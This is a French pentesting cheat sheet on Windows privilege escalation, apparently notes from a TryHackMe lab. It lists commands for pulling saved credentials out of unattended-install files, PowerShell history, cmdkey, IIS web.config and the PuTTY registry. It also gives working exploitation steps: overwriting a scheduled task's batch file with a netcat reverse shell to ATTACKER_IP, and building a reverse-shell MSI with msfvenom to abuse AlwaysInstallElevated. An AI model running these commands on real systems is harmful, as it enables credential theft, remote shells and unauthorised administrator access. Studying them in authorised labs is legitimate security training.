# Windows

Quelques sources possibles d'escalation de privilèges sous windows

### Unattended Windows Installations

Avec MDT:
```
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml
```

Peut contenir :

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>domain.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History

cmd.exe
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

powershell.exe
```
cat $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Saved Windows Credentials

```
cmdkey /list
```

En cas de trouvaille interressante 
```
runas /savecred /user:admin cmd.exe
```

### IIS Configuration

web.config
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### PuTTY

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

# Autres Techniques

### Planificateur de tâches
Pour lister les tâches planifiées : `schtasks` 

```
schtasks /query /tn vulntask /fo list /v
```
```
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```
Pour obtenir des infos sur `Task To Run`

```
icacls c:\tasks\schtask.bat
```
```
C:\> icacls c:\tasks\schtask.bat
C:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

#### Exploitation

Détectable par les antivirus !
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

#### Exécution manuelle

```
schtasks /run /tn vulntask
```

### AlwaysInstallElevated

Exploitation de .msi :
Vérifier si ces deux sont présents
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

si oui
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.147.119 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
